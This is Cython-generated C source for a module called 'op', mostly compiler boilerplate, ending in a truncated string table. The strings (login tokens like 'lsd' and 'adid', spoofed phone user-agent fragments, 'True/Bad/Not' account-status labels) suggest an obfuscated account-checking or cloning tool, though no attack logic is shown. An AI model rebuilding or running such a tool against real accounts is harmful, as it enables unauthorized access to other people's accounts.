__Pyx_PyList_Append(PyObject* list, PyObject* x) {\n    PyListObject* L = (PyListObject*) list;\n    Py_ssize_t len = Py_SIZE(list);\n    if (likely(L->allocated > len) & likely(len > (L->allocated >> 1))) {\n        Py_INCREF(x);\n        #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030d0000\n        L->ob_item[len] = x;\n        #else\n        PyList_SET_ITEM(list, len, x);\n        #endif\n        __Pyx_SET_SIZE(list, len + 1);\n        return 0;\n    }\n    return PyList_Append(list, x);\n}\n#else\n#define __Pyx_PyList_Append(L,x) PyList_Append(L,x)\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);\n\n\nstatic int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);\n\n\nstatic PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);\n\n\nstatic CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x);\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject *key);\n#else\n#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)\n#endif\n\n\n#if !CYTHON_USE_TYPE_SPECS || (!CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x03090000)\n#define __Pyx_call_type_traverse(o, always_call, visit, arg) 0\n#else\nstatic int __Pyx_call_type_traverse(PyObject *o, int always_call, visitproc visit, void *arg);\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic PyObject *__Pyx_GetTypeDict(PyTypeObject *tp);\n#endif\n\n\nstatic int __Pyx__SetItemOnTypeDict(PyTypeObject *tp, PyObject *k, PyObject *v);\n#define __Pyx_SetItemOnTypeDict(tp, k, v) __Pyx__SetItemOnTypeDict((PyTypeObject*)tp, k, v)\n\n\nstatic CYTHON_INLINE int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type);\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);\n\n\nstatic PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name);\n\n\n#if CYTHON_COMPILING_IN_CPYTHON || CYTHON_COMPILING_IN_LIMITED_API || CYTHON_USE_TYPE_SPECS\nstatic int __Pyx_validate_bases_tuple(const char *type_name, Py_ssize_t dictoffset, PyObject *bases);\n#endif\n\n\nCYTHON_UNUSED static int __Pyx_PyType_Ready(PyTypeObject *t);\n\n\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\n\n\nstatic PyObject *__Pyx_ImportDottedModule(PyObject *name, PyObject *parts_tuple);\nstatic PyObject *__Pyx_ImportDottedModule_WalkParts(PyObject *module, PyObject *name, PyObject *parts_tuple);\n\n\nstatic PyObject *__Pyx_PyList_Pack(Py_ssize_t n, ...);\n\n\nstatic PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);\n\n\n#define __Pyx_PySequence_Multiply_Left(mul, seq)  __Pyx_PySequence_Multiply(seq, mul)\nstatic CYTHON_INLINE PyObject* __Pyx_PySequence_Multiply(PyObject *seq, Py_ssize_t mul);\n\n\nstatic PyObject *__Pyx_FetchSharedCythonABIModule(void);\n\n\nstatic CYTHON_INLINE PyObject *__Pyx_PyDict_SetDefault(PyObject *d, PyObject *key, PyObject *default_value, int is_safe_type);\n\n\nstatic PyTypeObject* __Pyx_FetchCommonTypeFromSpec(PyTypeObject *metaclass, PyObject *module, PyType_Spec *spec, PyObject *bases);\n\n\nstatic int __pyx_CommonTypesMetaclass_init(PyObject *module);\n#define __Pyx_CommonTypesMetaclass_USED\n\n\nstatic PyObject *__Pyx_PyMethod_New(PyObject *func, PyObject *self, PyObject *typ);\n\n\n#if CYTHON_METH_FASTCALL && (CYTHON_VECTORCALL || CYTHON_BACKPORT_VECTORCALL)\nstatic CYTHON_INLINE PyObject *__Pyx_PyVectorcall_FastCallDict(PyObject *func, __pyx_vectorcallfunc vc, PyObject *const *args, size_t nargs, PyObject *kw);\n#endif\n\n\n#define __Pyx_CyFunction_USED\n#define __Pyx_CYFUNCTION_STATICMETHOD  0x01\n#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02\n#define __Pyx_CYFUNCTION_CCLASS        0x04\n#define __Pyx_CYFUNCTION_COROUTINE     0x08\n#define __Pyx_CyFunction_GetClosure(f)\\\n    (((__pyx_CyFunctionObject *) (f))->func_closure)\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_CyFunction_GetClassObj(f)\\\n      (((__pyx_CyFunctionObject *) (f))->func_classobj)\n#else\n  #define __Pyx_CyFunction_GetClassObj(f)\\\n      ((PyObject*) ((PyCMethodObject *) (f))->mm_class)\n#endif\n#define __Pyx_CyFunction_SetClassObj(f, classobj)\\\n    __Pyx__CyFunction_SetClassObj((__pyx_CyFunctionObject *) (f), (classobj))\n#define __Pyx_CyFunction_Defaults(type, f)\\\n    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))\n#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\\\n    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)\ntypedef struct {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject_HEAD\n    PyObject *func;\n#elif PY_VERSION_HEX < 0x030900B1\n    PyCFunctionObject func;\n#else\n    PyCMethodObject func;\n#endif\n#if CYTHON_BACKPORT_VECTORCALL ||\\\n        (CYTHON_COMPILING_IN_LIMITED_API && CYTHON_METH_FASTCALL)\n    __pyx_vectorcallfunc func_vectorcall;\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *func_weakreflist;\n#endif\n    PyObject *func_dict;\n    PyObject *func_name;\n    PyObject *func_qualname;\n    PyObject *func_doc;\n    PyObject *func_globals;\n    PyObject *func_code;\n    PyObject *func_closure;\n#if PY_VERSION_HEX < 0x030900B1 || CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *func_classobj;\n#endif\n    PyObject *defaults;\n    int flags;\n    PyObject *defaults_tuple;\n    PyObject *defaults_kwdict;\n    PyObject *(*defaults_getter)(PyObject *);\n    PyObject *func_annotations;\n    PyObject *func_is_coroutine;\n} __pyx_CyFunctionObject;\n#undef __Pyx_CyOrPyCFunction_Check\n#define __Pyx_CyFunction_Check(obj)  __Pyx_TypeCheck(obj, __pyx_mstate_global->__pyx_CyFunctionType)\n#define __Pyx_CyOrPyCFunction_Check(obj)  __Pyx_TypeCheck2(obj, __pyx_mstate_global->__pyx_CyFunctionType, &PyCFunction_Type)\n#define __Pyx_CyFunction_CheckExact(obj)  __Pyx_IS_TYPE(obj, __pyx_mstate_global->__pyx_CyFunctionType)\nstatic CYTHON_INLINE int __Pyx__IsSameCyOrCFunction(PyObject *func, void (*cfunc)(void));\n#undef __Pyx_IsSameCFunction\n#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCyOrCFunction(func, cfunc)\nstatic PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,\n                                      int flags, PyObject* qualname,\n                                      PyObject *closure,\n                                      PyObject *module, PyObject *globals,\n                                      PyObject* code);\nstatic CYTHON_INLINE void __Pyx__CyFunction_SetClassObj(__pyx_CyFunctionObject* f, PyObject* classobj);\nstatic CYTHON_INLINE PyObject *__Pyx_CyFunction_InitDefaults(PyObject *func,\n                                                         PyTypeObject *defaults_type);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,\n                                                            PyObject *tuple);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,\n                                                             PyObject *dict);\nstatic CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,\n                                                              PyObject *dict);\nstatic int __pyx_CyFunction_init(PyObject *module);\n#if CYTHON_METH_FASTCALL\nstatic PyObject * __Pyx_CyFunction_Vectorcall_NOARGS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_O(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\nstatic PyObject * __Pyx_CyFunction_Vectorcall_FASTCALL_KEYWORDS_METHOD(PyObject *func, PyObject *const *args, size_t nargsf, PyObject *kwnames);\n#if CYTHON_BACKPORT_VECTORCALL || CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyFunction_func_vectorcall(f) (((__pyx_CyFunctionObject*)f)->func_vectorcall)\n#else\n#define __Pyx_CyFunction_func_vectorcall(f) (((PyCFunctionObject*)f)->vectorcall)\n#endif\n#endif\n\n\nstatic PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,\n                                      int flags, PyObject* qualname,\n                                      PyObject *closure,\n                                      PyObject *module, PyObject *globals,\n                                      PyObject* code);\n\n\n#if CYTHON_CLINE_IN_TRACEBACK && CYTHON_CLINE_IN_TRACEBACK_RUNTIME\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#else\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\ntypedef PyObject __Pyx_CachedCodeObjectType;\n#else\ntypedef PyCodeObject __Pyx_CachedCodeObjectType;\n#endif\ntypedef struct {\n    __Pyx_CachedCodeObjectType* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    __pyx_atomic_int_type accessor_count;\n  #endif\n};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic __Pyx_CachedCodeObjectType *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, __Pyx_CachedCodeObjectType* code_object);\n\n\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n\n#if !defined(__INTEL_COMPILER) && defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_From_long(long value);\n\n\nstatic CYTHON_INLINE long __Pyx_PyLong_As_long(PyObject *);\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\ntypedef PyObject *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%U"\n#define __Pyx_DECREF_TypeName(obj) Py_XDECREF(obj)\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n#define __Pyx_PyType_GetFullyQualifiedName PyType_GetFullyQualifiedName\n#else\nstatic __Pyx_TypeName __Pyx_PyType_GetFullyQualifiedName(PyTypeObject* tp);\n#endif\n#else  // !LIMITED_API\ntypedef const char *__Pyx_TypeName;\n#define __Pyx_FMT_TYPENAME "%.200s"\n#define __Pyx_PyType_GetFullyQualifiedName(tp) ((tp)->tp_name)\n#define __Pyx_DECREF_TypeName(obj)\n#endif\n\n\nstatic CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *);\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) __Pyx_IsAnySubtype2(Py_TYPE(obj), (PyTypeObject *)type1, (PyTypeObject *)type2)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#define __Pyx_TypeCheck2(obj, type1, type2) (PyObject_TypeCheck(obj, (PyTypeObject *)type1) || PyObject_TypeCheck(obj, (PyTypeObject *)type2))\n#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2) {\n    return PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2);\n}\n#endif\n#define __Pyx_PyErr_ExceptionMatches2(err1, err2)  __Pyx_PyErr_GivenExceptionMatches2(__Pyx_PyErr_CurrentExceptionType(), err1, err2)\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n#ifdef PyExceptionInstance_Check\n  #define __Pyx_PyBaseException_Check(obj) PyExceptionInstance_Check(obj)\n#else\n  #define __Pyx_PyBaseException_Check(obj) __Pyx_TypeCheck(obj, PyExc_BaseException)\n#endif\n\n\nstatic void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);\n\n\nstatic CYTHON_INLINE PyObject *__Pyx_PyIter_Next_Plain(PyObject *iterator);\n#if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x030A0000\nstatic PyObject *__Pyx_GetBuiltinNext_LimitedAPI(void);\n#endif\n\n\nstatic CYTHON_INLINE void __Pyx_ReturnWithStopIteration(PyObject* value, int async, int iternext);\n\n\nstruct __pyx_CoroutineObject;\ntypedef PyObject *(*__pyx_coroutine_body_t)(struct __pyx_CoroutineObject *, PyThreadState *, PyObject *);\n#if CYTHON_USE_EXC_INFO_STACK\n#define __Pyx_ExcInfoStruct  _PyErr_StackItem\n#else\ntypedef struct {\n    PyObject *exc_type;\n    PyObject *exc_value;\n    PyObject *exc_traceback;\n} __Pyx_ExcInfoStruct;\n#endif\ntypedef struct __pyx_CoroutineObject {\n    PyObject_HEAD\n    __pyx_coroutine_body_t body;\n    PyObject *closure;\n    __Pyx_ExcInfoStruct gi_exc_state;\n    PyObject *gi_weakreflist;\n    PyObject *classobj;\n    PyObject *yieldfrom;\n    __Pyx_pyiter_sendfunc yieldfrom_am_send;\n    PyObject *gi_name;\n    PyObject *gi_qualname;\n    PyObject *gi_modulename;\n    PyObject *gi_code;\n    PyObject *gi_frame;\n#if CYTHON_USE_SYS_MONITORING && (CYTHON_PROFILE || CYTHON_TRACE)\n    PyMonitoringState __pyx_pymonitoring_state[__Pyx_MonitoringEventTypes_CyGen_count];\n    uint64_t __pyx_pymonitoring_version;\n#endif\n    int resume_label;\n    char is_running;\n} __pyx_CoroutineObject;\nstatic __pyx_CoroutineObject *__Pyx__Coroutine_New(\n    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,\n    PyObject *name, PyObject *qualname, PyObject *module_name);\nstatic __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(\n            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,\n            PyObject *name, PyObject *qualname, PyObject *module_name);\nstatic CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);\nstatic int __Pyx_Coroutine_clear(PyObject *self);\nstatic __Pyx_PySendResult __Pyx_Coroutine_AmSend(PyObject *self, PyObject *value, PyObject **retval);\nstatic PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);\nstatic __Pyx_PySendResult __Pyx_Coroutine_Close(PyObject *self, PyObject **retval);\nstatic PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);\n#if CYTHON_USE_EXC_INFO_STACK\n#define __Pyx_Coroutine_SwapException(self)\n#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)\n#else\n#define __Pyx_Coroutine_SwapException(self) {\\\n    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\\\n    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\\\n    }\n#define __Pyx_Coroutine_ResetAndClearException(self) {\\\n    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\\\n    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\\\n    }\n#endif\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\\\n    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)\n#else\n#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\\\n    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)\n#endif\nstatic int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);\nstatic CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);\nstatic char __Pyx_Coroutine_test_and_set_is_running(__pyx_CoroutineObject *gen);\nstatic void __Pyx_Coroutine_unset_is_running(__pyx_CoroutineObject *gen);\nstatic char __Pyx_Coroutine_get_is_running(__pyx_CoroutineObject *gen);\nstatic PyObject *__Pyx_Coroutine_get_is_running_getter(PyObject *gen, void *closure);\n#if __PYX_HAS_PY_AM_SEND == 2\nstatic void __Pyx_SetBackportTypeAmSend(PyTypeObject *type, __Pyx_PyAsyncMethodsStruct *static_amsend_methods, __Pyx_pyiter_sendfunc am_send);\n#endif\nstatic PyObject *__Pyx_Coroutine_fail_reduce_ex(PyObject *self, PyObject *arg);\n\n\n#define __Pyx_Generator_USED\n#define __Pyx_Generator_CheckExact(obj) __Pyx_IS_TYPE(obj, __pyx_mstate_global->__pyx_GeneratorType)\n#define __Pyx_Generator_New(body, code, closure, name, qualname, module_name)\\\n    __Pyx__Coroutine_New(__pyx_mstate_global->__pyx_GeneratorType, body, code, closure, name, qualname, module_name)\nstatic PyObject *__Pyx_Generator_Next(PyObject *self);\nstatic int __pyx_Generator_init(PyObject *module);\nstatic CYTHON_INLINE PyObject *__Pyx_Generator_GetInlinedResult(PyObject *self);\n\n\nstatic unsigned long __Pyx_get_runtime_version(void);\n\n\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer);\n\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE\nstatic PyObject *__Pyx_State_FindModule(void*);\nstatic int __Pyx_State_AddModule(PyObject* module, void*);\nstatic int __Pyx_State_RemoveModule(void*);\n#elif CYTHON_USE_MODULE_STATE\n#define __Pyx_State_FindModule PyState_FindModule\n#define __Pyx_State_AddModule PyState_AddModule\n#define __Pyx_State_RemoveModule PyState_RemoveModule\n#endif\n\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\n    #if CYTHON_METH_FASTCALL\n        #define __PYX_FASTCALL_ABI_SUFFIX  "_fastcall"\n    #else\n        #define __PYX_FASTCALL_ABI_SUFFIX\n    #endif\n    #define __PYX_LIMITED_ABI_SUFFIX "limited" __PYX_FASTCALL_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX\n#else\n    #define __PYX_LIMITED_ABI_SUFFIX\n#endif\n#if __PYX_HAS_PY_AM_SEND == 1\n    #define __PYX_AM_SEND_ABI_SUFFIX\n#elif __PYX_HAS_PY_AM_SEND == 2\n    #define __PYX_AM_SEND_ABI_SUFFIX "amsendbackport"\n#else\n    #define __PYX_AM_SEND_ABI_SUFFIX "noamsend"\n#endif\n#ifndef __PYX_MONITORING_ABI_SUFFIX\n    #define __PYX_MONITORING_ABI_SUFFIX\n#endif\n#if CYTHON_USE_TP_FINALIZE\n    #define __PYX_TP_FINALIZE_ABI_SUFFIX\n#else\n    #define __PYX_TP_FINALIZE_ABI_SUFFIX "nofinalize"\n#endif\n#if CYTHON_USE_FREELISTS || !defined(__Pyx_AsyncGen_USED)\n    #define __PYX_FREELISTS_ABI_SUFFIX\n#else\n    #define __PYX_FREELISTS_ABI_SUFFIX "nofreelists"\n#endif\n#define CYTHON_ABI  __PYX_ABI_VERSION __PYX_LIMITED_ABI_SUFFIX __PYX_MONITORING_ABI_SUFFIX __PYX_TP_FINALIZE_ABI_SUFFIX __PYX_FREELISTS_ABI_SUFFIX __PYX_AM_SEND_ABI_SUFFIX\n#define __PYX_ABI_MODULE_NAME "_cython_" CYTHON_ABI\n#define __PYX_TYPE_MODULE_PREFIX __PYX_ABI_MODULE_NAME "."\n\n\n\n\n\n#define __Pyx_MODULE_NAME "op"\nextern int __pyx_module_is_main_op;\nint __pyx_module_is_main_op = 0;\n\n\n\nstatic PyObject *__pyx_builtin_print;\nstatic PyObject *__pyx_builtin_input;\nstatic PyObject *__pyx_builtin_open;\nstatic PyObject *__pyx_builtin_range;\n\nstatic const char __pyx_k_[] = "\\n\\n\\n";\nstatic const char __pyx_k_0[] = "0";\nstatic const char __pyx_k_1[] = "1";\nstatic const char __pyx_k_4[] = "4";\nstatic const char __pyx_k_a[] = "a";\nstatic const char __pyx_k_b[] = "b";\nstatic const char __pyx_k_e[] = "e";\nstatic const char __pyx_k_f[] = "f";\nstatic const char __pyx_k_i[] = "i";\nstatic const char __pyx_k_k[] = "k";\nstatic const char __pyx_k_m[] = "m";\nstatic const char __pyx_k_o[] = "o";\nstatic const char __pyx_k_q[] = "\\220q";\nstatic const char __pyx_k_r[] = "r";\nstatic const char __pyx_k_t[] = "t";\nstatic const char __pyx_k_w[] = "w";\nstatic const char __pyx_k_x[] = "x";\nstatic const char __pyx_k_1f[] = ".1f";\nstatic const char __pyx_k_ID[] = "ID";\nstatic const char __pyx_k_Id[] = "Id";\nstatic const char __pyx_k_TL[] = "TL";\nstatic const char __pyx_k__2[] = "";\nstatic const char __pyx_k__3[] = "*";\nstatic const char __pyx_k__4[] = "[\\"";\nstatic const char __pyx_k__5[] = "\\",\\"";\nstatic const char __pyx_k__6[] = "\\"";\nstatic const char __pyx_k__7[] = "//";\nstatic const char __pyx_k__8[] = "\\n";\nstatic const char __pyx_k__9[] = "\\"}";\nstatic const char __pyx_k_bo[] = "bo";\nstatic const char __pyx_k_cc[] = "cc";\nstatic const char __pyx_k_gc[] = "gc";\nstatic const char __pyx_k_gg[] = "gg";\nstatic const char __pyx_k_n1[] = "n1";\nstatic const char __pyx_k_n2[] = "n2";\nstatic const char __pyx_k_nt[] = "nt";\nstatic const char __pyx_k_ok[] = "ok";\nstatic const char __pyx_k_op[] = "op";\nstatic const char __pyx_k_os[] = "os";\nstatic const char __pyx_k_ow[] = "ow";\nstatic const char __pyx_k_pk[] = "pk";\nstatic const char __pyx_k_pp[] = "pp";\nstatic const char __pyx_k_re[] = "re";\nstatic const char __pyx_k_rr[] = "rr";\nstatic const char __pyx_k_ss[] = "ss";\nstatic const char __pyx_k_tl[] = "tl";\nstatic const char __pyx_k_ua[] = "ua";\nstatic const char __pyx_k_yy[] = "yy";\nstatic const char __pyx_k_1_2[] = "\\2501";\nstatic const char __pyx_k_356[] = "356";\nstatic const char __pyx_k_Bad[] = "\\n[ \\342\\232\\232 ]  Bad    \\342\\236\\234 ";\nstatic const char __pyx_k_Bio[] = "\\n\\360\\237\\227\\236 Bio \\342\\236\\234 ";\nstatic const char __pyx_k_Gen[] = "\\n[ \\342\\232\\232 ]  Gen    \\342\\236\\234 ";\nstatic const char __pyx_k_HTC[] = "HTC";\nstatic const char __pyx_k_Ido[] = "Ido";\nstatic const char __pyx_k_Not[] = "\\n[ \\342\\232\\232 ]  Not    \\342\\236\\234 ";\nstatic const char __pyx_k_ZTE[] = "ZTE";\nstatic const char __pyx_k__10[] = "@";\nstatic const char __pyx_k__11[] = "; ";\nstatic const char __pyx_k__12[] = ")";\nstatic const char __pyx_k__13[] = ".";\nstatic const char __pyx_k__14[] = "\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201\\342\\224\\201";\nstatic const char __pyx_k__15[] = "\\360\\235\\227\\225\\360\\235\\227\\242\\360\\235\\227\\247 \\360\\235\\227\\247\\360\\235\\227\\242\\360\\235\\227\\236\\360\\235\\227\\230\\360\\235\\227\\241 \\342\\270\\270 : \\342\\200\\224 ";\nstatic const char __pyx_k__16[] = "\\360\\235\\227\\226\\360\\235\\227\\233\\360\\235\\227\\224\\360\\235\\227\\247 \\360\\235\\227\\234\\360\\235\\227\\227 \\342\\270\\270 : \\342\\200\\224 ";\nstatic const char __pyx_k__17[] = "?";\nstatic const char __pyx_k__18[] = "\\230\\021";\nstatic const char __pyx_k__19[] = "_";\nstatic const char __pyx_k_bbk[] = "bbk";\nstatic const char __pyx_k_bio[] = "bio";\nstatic const char __pyx_k_bs4[] = "bs4";\nstatic const char __pyx_k_cls[] = "cls";\nstatic const char __pyx_k_dev[] = "dev";\nstatic const char __pyx_k_dnt[] = "dnt";\nstatic const char __pyx_k_dpi[] = "dpi; ";\nstatic const char __pyx_k_get[] = "get";\nstatic const char __pyx_k_ggb[] = "ggb";\nstatic const char __pyx_k_he3[] = "he3";\nstatic const char __pyx_k_ids[] = "ids";\nstatic const char __pyx_k_lsd[] = "lsd";\nstatic const char __pyx_k_md5[] = "md5";\nstatic const char __pyx_k_pop[] = "pop";\nstatic const char __pyx_k_red[] = "red";\nstatic const char __pyx_k_rnd[] = "rnd";\nstatic const char __pyx_k_sys[] = "sys";\nstatic const char __pyx_k_tll[] = "tll";\nstatic const char __pyx_k_tok[] = "tok";\nstatic const char __pyx_k_uid[] = "uid";\nstatic const char __pyx_k_uui[] = "uui";\nstatic const char __pyx_k_uuu[] = "uuu";\nstatic const char __pyx_k_38_5[] = "\\033[38;5;";\nstatic const char __pyx_k_ASUS[] = "ASUS";\nstatic const char __pyx_k_Date[] = "  \\n\\360\\237\\223\\205 Date \\342\\236\\234 ";\nstatic const char __pyx_k_Fore[] = "Fore";\nstatic const char __pyx_k_Host[] = "Host";\nstatic const char __pyx_k_Meta[] = "\\n\\360\\237\\252\\204 Meta \\342\\236\\234 ";\nstatic const char __pyx_k_None[] = "None";\nstatic const char __pyx_k_OPPO[] = "OPPO";\nstatic const char __pyx_k_SM_T[] = "; SM-T";\nstatic const char __pyx_k_SONY[] = "SONY";\nstatic const char __pyx_k_True[] = "\\n[ \\342\\232\\232 ]  True   \\342\\236\\234 ";\nstatic const char __pyx_k_VIVO[] = "VIVO";\nstatic const char __pyx_k_WIFI[] = "WIFI";\nstatic const char __pyx_k_adid[] = "adid";\nstatic const char __pyx_k_bizz[] = "bizz";\nstatic const char __pyx_k_data[] = "data";\nstatic const char __pyx_k_date[] = "date";\nstatic const char __pyx_k_exit[] = "__exit__";\nstatic const char __pyx_k_file[] = "file";\nstatic const char __pyx_k_font[] = "font";\nstatic const char __pyx_k_fowg[] = "fowg";\nstatic const char __pyx_k_fows[] = "fows";\nstatic const char __pyx_k_func[] = "__func__";\nstatic const char __pyx_k_guid[] = "guid";\nstatic const char __pyx_k_hits[] = "hits";\nstatic const char __pyx_k_host[] = "host";\nstatic const char __pyx_k_join[] = "join";\nstatic const char __pyx_k_json[] = "json";\nstatic const char __pyx_k_logo[] = "logo";\nstatic const char __pyx_k_main[] = "__main__";\nstatic const char __pyx_k_meta[] = "meta";\nstatic const char __pyx_k_name[] = "name";\nstatic const char __pyx_k_next[] = "next";\nstatic const char __pyx_k_null[] = "\\",null,\\"";\nstatic const char __pyx_k_open[] = "open";\nstatic const char __pyx_k_post[] = "post";\nstatic const char __pyx_k_pppp[] = "pppp";\nstatic const char __pyx_k_read[] = "read";\nstatic const char __pyx_k_res1[] = "res1";\nstatic const char __pyx_k_rest[] = "rest";\nstatic const char __pyx_k_send[] = "send";\nstatic const char __pyx_k_spec[] = "__spec__";\nstatic const char __pyx_k_test[] = "__test__";\nstatic const char __pyx_k_text[] = "text";\nstatic const char __pyx_k_time[] = "time";\nstatic const char __pyx_k_true[] = "true";\nstatic const char __pyx_k_user[] = "user";\nstatic const char __pyx_k_util[] = "util";\nstatic const char __pyx_k_uuid[] = "uuid";\nstatic const char __pyx_k_1_000[] 